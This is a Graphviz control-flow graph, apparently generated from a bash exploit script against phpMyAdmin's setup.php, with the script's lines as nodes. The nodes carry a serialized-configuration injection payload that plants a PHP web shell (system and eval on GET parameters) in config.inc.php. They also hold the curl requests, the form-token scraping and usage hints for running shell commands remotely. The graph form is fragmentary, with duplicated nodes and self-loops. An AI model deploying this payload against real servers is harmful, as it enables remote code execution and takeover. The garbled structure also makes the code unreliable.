digraph {
0 [label="[ $# -ne 1 ] "];
0 -> 2 [label="SC,N,if,"];
2 [label="echo usage: ./$(basename $0) <phpMyAdmin_base_URL> "];
2 -> 66 [label="then,"];
66 [label="basename $0 "];
66 -> 6 [label="N,"];
6 [label="echo i.e.: ./$(basename $0) http://target.tld/phpMyAdmin/ "];
6 -> 66 [label="\n,"];
66 [label="basename $0 "];
66 -> 101 [label="N,"];
101 [label="exit "];
101 -> 12 [label="\n,"];
12 [label="which curl /dev/null "];
12 -> 82 [label="\n,fi,SC,N,if,N,!,"];
82 [label="/dev/null "];
82 -> 82
16 [label="echo sorry but you need curl for this script to work! "];
16 -> 18 [label="then,"];
18 [label="echo on Debian/Ubuntu: sudo apt-get install curl "];
18 -> 101 [label="\n,"];
101 [label="exit "];
101 -> 22 [label="\n,"];
22 [label="postdata=token=$1&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:23:%22host%27]=%27%27%3b%20phpinfo%28%29%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix "];
22 -> 24 [label="\n,fi,N,function,SC,{,"];
24 [label="postdata2=token=$1&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=%27%27%3b%20if($_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3bsystem($_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}if($_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval($_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix "];
24 -> 26 [label="N,\n,"];
26 [label="flag=/tmp/$(basename $0).$RANDOM.phpinfo.flag.html "];
26 -> 66 [label="\n,"];
66 [label="basename $0 "];
66 -> 30 [label="N,N,"];
30 [label="echo [+] attempting to inject phpinfo() ... "];
30 -> 32 [label="\n,"];
32 [label="curl -ks -b $2 -d $postdata --url $3/scripts/setup.php /dev/null "];
32 -> 82 [label="\n,"];
82 [label="/dev/null "];
82 -> 82
36 [label="curl -ks --url $3/config/config.inc.php "];
36 -> 38 [label="\n,SC,N,if,N,"];
38 [label="grep phpinfo() /dev/null "];
38 -> 82 [label="N,"];
82 [label="/dev/null "];
82 -> 82
42 [label="curl -ks --url $3/config/config.inc.php $flag "];
42 -> 44 [label="then,"];
44 [label="$flag "];
44 -> 44
46 [label="echo [+] success! phpinfo() injected successfully! output saved on $flag "];
46 -> 48 [label="\n,"];
48 [label="curl -ks -b $2 -d $postdata2 --url $3/scripts/setup.php /dev/null "];
48 -> 82 [label="\n,"];
82 [label="/dev/null "];
82 -> 82
52 [label="echo [+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.: "];
52 -> 54 [label="\n,"];
54 [label="echo     $3/config/config.inc.php?c=ls+-l+/ "];
54 -> 56 [label="\n,"];
56 [label="echo     $3/config/config.inc.php?p=phpinfo() "];
56 -> 58 [label="\n,"];
58 [label="echo     please send any feedback/improvements for this script to unknown.pentester<AT_sign__here>gmail.com "];
58 -> 60 [label="\n,"];
60 [label="echo [+] no luck injecting to $3/config/config.inc.php :( "];
60 -> 101 [label="\n,else,"];
101 [label="exit "];
101 -> 64 [label="\n,"];
64 [label="cookiejar=/tmp/$(basename $0).$RANDOM.txt "];
64 -> 66 [label="\n,fi,\n,},"];
66 [label="basename $0 "];
66 -> 68 [label="N,N,"];
68 [label="token=`curl -ks -c $cookiejar --url \"$1/scripts/setup.php\" | grep \\\"token\\\" | head -n 1 | cut -d \\\" -f 12` "];
68 -> 68
70 [label="curl -ks -c $cookiejar --url $1/scripts/setup.php "];
70 -> 72 [label="N,N,N,"];
72 [label="grep \"token\" "];
72 -> 74 [label="N,"];
74 [label="head -n 1 "];
74 -> 76 [label="N,"];
76 [label="cut -d \" -f 12 "];
76 -> 78 [label="N,"];
78 [label="echo [+] checking if phpMyAdmin exists on URL provided ... "];
78 -> 78
80 [label="grep phpMyAdmin $cookiejar /dev/null "];
80 -> 82 [label="SC,N,if,"];
82 [label="/dev/null "];
82 -> 82
84 [label="length=`echo -n $token | wc -c` "];
84 -> 86 [label="then,"];
86 [label="echo -n $token "];
86 -> 88 [label="N,N,N,"];
88 [label="wc -c "];
88 -> 90 [label="N,"];
90 [label="[ $length -eq 32 ] "];
90 -> 92 [label="\n,SC,N,if,"];
92 [label="echo [+] phpMyAdmin cookie and form token received successfully. Good! "];
92 -> 94 [label="then,"];
94 [label="exploit $token $cookiejar $1 "];
94 -> 96 [label="\n,"];
96 [label="echo [+] could not grab form token. you might want to try exploiting the vuln manually :( "];
96 -> 101 [label="\n,else,"];
101 [label="exit "];
101 -> 100 [label="\n,"];
100 [label="echo [+] phpMyAdmin NOT found! phpMyAdmin base URL incorrectly typed? wrong case-sensitivity? "];
100 -> 101 [label="\n,fi,\n,else,"];
}
